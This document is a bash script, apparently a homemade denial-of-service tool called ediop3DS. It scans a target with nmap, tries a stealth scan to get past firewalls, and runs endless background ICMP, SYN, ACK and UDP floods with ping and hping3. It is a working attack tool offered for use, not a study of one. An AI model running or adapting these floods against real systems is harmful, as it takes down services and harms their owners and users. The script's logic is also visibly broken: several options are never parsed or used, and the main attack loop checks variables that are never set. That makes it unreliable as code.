#!/bin/bash

# Color definitions
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
CYAN="\e[36m"
WHITE="\e[97m"
RESET="\e[0m"

# Display logo function
display_logo() {
    echo -e "${CYAN}"
    echo -e """
███████╗██████╗░██╗░█████╗░██████╗░██████╗░
██╔════╝██╔══██╗██║██╔══██╗██╔══██╗╚════██╗
█████╗░░██║░░██║██║██║░░██║██████╔╝░█████╔╝
██╔══╝░░██║░░██║██║██║░░██║██╔═══╝░░╚═══██╗
███████╗██████╔╝██║╚█████╔╝██║░░░░░██████╔╝
╚══════╝╚═════╝░╚═╝░╚════╝░╚═╝░░░░░╚═════╝░

██████╗░░██████╗
██╔══██╗██╔════╝
██║░░██║╚█████╗░
██║░░██║░╚═══██╗
██████╔╝██████╔╝
╚═════╝░╚═════╝░
"""
    echo -e "${RESET}"
}

# Help function
show_help() {
    display_logo
    echo -e "\nUsage: ./ediop3DS.sh -u target_ip_or_url -p port [options]\n"
    echo -e "${YELLOW}Options:${RESET}"
    echo -e "  -u    Target IP or URL (required)"
    echo -e "  -p    Target Port (default: 80)"
    echo -e "  -h    Show this help message"
    echo -e "  -s    Scan target for open ports before attacking"
    echo -e "  -r    Retry attack without port if no open ports are found"
    echo -e "  -i    Send ICMP ping flood (requires root)"
    echo -e "  -S    Send TCP SYN flood (requires root)"
    echo -e "  -A    Send TCP ACK flood (requires root)"
    echo -e "  -U    Send UDP flood (requires root)"
    echo -e "  -f    Specify a spoofed source IP address"
    echo -e "  -n    Set the number of requests to send (default: 1000)"
    echo -e "  -H    Send custom HTTP headers"
    echo -e "  -v    Enable verbose output"
    echo -e "  -pSize  Specify packet size for attacks (default: 56)"
    echo -e "  -sFlag  Specify TCP flag (SYN, ACK, etc.)"
    echo -e "  -seq   Specify sequence number for TCP packets"
    echo -e "  -win   Specify window size for TCP packets"
    echo -e "  -proto Specify protocol for attack (TCP, UDP, ICMP, RAW-IP)"
    echo -e "  -P    Specify packet delay (in ms)"
}

# Function to send HTTP request with custom headers
send_http_request() {
    target=$1
    custom_headers=$2
    echo -e "${CYAN}[*] Sending HTTP request to $target${RESET}"
    
    if [ -n "$custom_headers" ]; then
        echo -e "${CYAN}[*] Using custom headers:${RESET} $custom_headers"
        curl -s -X GET $target -H "$custom_headers"
    else
        curl -s -X GET $target
    fi
}

# Function to scan open ports on target
scan_ports() {
    target=$1
    echo -e "${CYAN}[*] Scanning for open ports on $target${RESET}"
    
    open_ports=$(nmap -p- --min-rate=5000 -T4 $target | grep 'open' | awk -F '/' '{print $1}')
    
    if [ -z "$open_ports" ]; then
        echo -e "${RED}[!] No open ports found.${RESET}"
        return 1
    else
        echo -e "${GREEN}[+] Open ports: $open_ports${RESET}"
        port=$(echo "$open_ports" | head -n 1)  # Assign the first open port
    fi
}

# Anti-DDoS/Firewall Detection and Bypass with Nmap
anti_ddos_detection() {
    target=$1
    echo -e "${CYAN}[*] Checking for firewall or anti-DDoS protections on $target${RESET}"
    
    # Scan the first 1000 ports for a basic check
    firewall_check=$(nmap -p 1-1000 $target | grep 'filtered')
    if [ -n "$firewall_check" ]; then
        echo -e "${RED}[!] Potential firewall detected on $target, some ports are filtered.${RESET}"
        
        # Bypass Firewall (Attempting a more stealthy scan)
        echo -e "${CYAN}[*] Attempting to bypass firewall with stealth SYN scan...${RESET}"
        nmap -sS -p 1-1000 --min-rate=5000 -T4 $target
    else
        echo -e "${GREEN}[+] No firewall detected on $target, ports are open.${RESET}"
    fi

    # Check response time for rate-limiting (simple check)
    echo -e "${CYAN}[*] Checking response time on $target...${RESET}"
    response_time=$(curl -s -o /dev/null -w "%{time_total}" $target)
    echo -e "${CYAN}[*] Response time: ${response_time}s${RESET}"
    if (( $(echo "$response_time > 1.0" | bc -l) )); then
        echo -e "${RED}[!] High response time detected on $target, possibly due to rate limiting or anti-DDoS protection.${RESET}"
    else
        echo -e "${GREEN}[+] Response time is normal on $target.${RESET}"
    fi
}

# Delay Testing Function
test_packet_delay() {
    target=$1
    packet_delay=$2
    if [ -n "$packet_delay" ]; then
        echo -e "${CYAN}[*] Testing packet delay on $target with a delay of ${packet_delay}ms${RESET}"
        curl -s -o /dev/null -w "%{time_total}" --max-time $packet_delay $target
        echo -e "${CYAN}[+] Testing complete. Packet delay is set to ${packet_delay}ms.${RESET}"
    fi
}

# ICMP flood attack
icmp_flood() {
    target=$1
    echo -e "${CYAN}[*] Attacking with ICMP flood on $target${RESET}"
    while true; do
        echo -e "${CYAN}[+] Attacking with ICMP flood...${RESET}"
        sudo ping -f $target &>/dev/null &
        echo -e "${CYAN}[+] Attacking IP: $target with ICMP flood...${RESET}"
        sleep 1
    done
}

# TCP SYN flood attack
syn_flood() {
    target=$1
    port=$2
    echo -e "${CYAN}[*] Attacking with TCP SYN flood on $target:$port${RESET}"
    while true; do
        echo -e "${CYAN}[+] Attacking with TCP SYN flood...${RESET}"
        sudo hping3 --syn -p $port --flood $target &>/dev/null &
        echo -e "${CYAN}[+] Attacking IP: $target with TCP SYN flood...${RESET}"
        sleep 1
    done
}

# TCP ACK flood attack
ack_flood() {
    target=$1
    port=$2
    echo -e "${CYAN}[*] Attacking with TCP ACK flood on $target:$port${RESET}"
    while true; do
        echo -e "${CYAN}[+] Attacking with TCP ACK flood...${RESET}"
        sudo hping3 --ack -p $port --flood $target &>/dev/null &
        echo -e "${CYAN}[+] Attacking IP: $target with TCP ACK flood...${RESET}"
        sleep 1
    done
}

# UDP flood attack
udp_flood() {
    target=$1
    port=$2
    echo -e "${CYAN}[*] Attacking with UDP flood on $target:$port${RESET}"
    while true; do
        echo -e "${CYAN}[+] Attacking with UDP flood...${RESET}"
        sudo hping3 --udp -p $port --flood $target &>/dev/null &
        echo -e "${CYAN}[+] Attacking IP: $target with UDP flood...${RESET}"
        sleep 1
    done
}

# --- Main Execution Loop ---
while getopts "u:p:hsrivf:n:H:A:U:W:T:t:Q:P:" opt; do
    case $opt in
        u) target=$OPTARG ;;
        p) port=$OPTARG ;;
        h) show_help; exit 0 ;;
        s) scan_ports $target ;;
        r) retry_attack=true ;;
        i) icmp_flood $target ;;
        S) syn_flood $target $port ;;
        A) ack_flood $target $port ;;
        U) udp_flood $target $port ;;
        f) spoofed_ip=$OPTARG ;;
        n) request_count=$OPTARG ;;
        H) custom_headers=$OPTARG ;;
        v) verbose=true ;;
        pSize) packet_size=$OPTARG ;;
        sFlag) tcp_flag=$OPTARG ;;
        seq) sequence_number=$OPTARG ;;
        win) window_size=$OPTARG ;;
        proto) protocol=$OPTARG ;;
        P) packet_delay=$OPTARG ;;
        \?) show_help; exit 1 ;;
    esac
done

# Debug: Print selected options for verification
if [ "$verbose" = true ]; then
    echo -e "${YELLOW}[DEBUG] Selected Options:${RESET}"
    echo -e "  Target: $target"
    echo -e "  Port: ${port:-80}"
    echo -e "  Protocol: ${protocol:-TCP}"
    echo -e "  Packet Size: ${packet_size:-56}"
    echo -e "  Spoofed IP: ${spoofed_ip:-None}"
    echo -e "  Custom Headers: ${custom_headers:-None}"
    echo -e "  Request Count: ${request_count:-1000}"
    echo -e "  Packet Delay: ${packet_delay:-None}"
fi

# Ensure target is provided, otherwise show help
if [ -z "$target" ]; then
    echo -e "${RED}[ERROR] Target (-u) is required.${RESET}"
    show_help
    exit 1
fi

# Anti-DDoS/firewall detection
anti_ddos_detection $target

# Execute retry logic if needed
if [ "$retry_attack" = true ]; then
    if [ -z "$port" ]; then
        echo -e "${YELLOW}[!] No port specified, scanning first...${RESET}"
        scan_ports $target
    fi
    echo -e "${GREEN}[+] Retrying attack with found port: $port${RESET}"
fi

# Test packet delay if specified
test_packet_delay $target $packet_delay

# Send HTTP request if needed
if [ -n "$custom_headers" ]; then
    send_http_request $target "$custom_headers"
fi

# Attack loop with real attack logic
while true; do
    if [ "$icmp_flood" ]; then
        icmp_flood $target
    elif [ "$syn_flood" ]; then
        syn_flood $target $port
    elif [ "$ack_flood" ]; then
        ack_flood $target $port
    elif [ "$udp_flood" ]; then
        udp_flood $target $port
    fi
done
